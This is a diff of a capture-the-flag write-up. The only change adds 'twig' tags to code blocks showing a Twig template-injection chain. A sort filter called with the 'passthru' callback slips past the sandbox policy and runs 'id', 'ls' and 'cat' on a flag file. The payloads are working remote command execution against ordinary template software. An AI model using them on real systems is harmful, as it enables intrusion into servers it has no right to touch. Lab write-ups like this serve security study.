@@ -250,7 +250,7 @@ Fields:
 ### 9.2 Initial Validation
 
 **Payload:**
-```
+```twig
 {% raw %}{{7*7}}{% endraw %}
 ```
 
@@ -290,7 +290,7 @@ The server implements a strict Twig `SecurityPolicy`:
 **Hypothesis:** If `sort` also accepts a callback but wasn't included in the Closure-only policy, it could execute system commands.
 
 **Test Payload:**
-```
+```twig
 {% raw %}{{['id', '']|sort('passthru')}}{% endraw %}
 ```
 
@@ -318,7 +318,7 @@ The developer hardened common SSTI vectors but overlooked `sort`, which internal
 ### 10.1 Directory Enumeration
 
 **Command:**
-```
+```twig
 {% raw %}{{['ls -la flags', '']|sort('passthru')}}{% endraw %}
 ```
 
@@ -333,7 +333,7 @@ drwxr-xr-x 6 ubuntu ubuntu 4096 Jul 31 2024 ..
 ### 10.2 File Retrieval
 
 **Command:**
-```
+```twig
 {% raw %}{{['cat flags/5d8af1dc14503c7e4bdc8e51a3469f48.txt', '']|sort('passthru')}}{% endraw %}
 ```
 
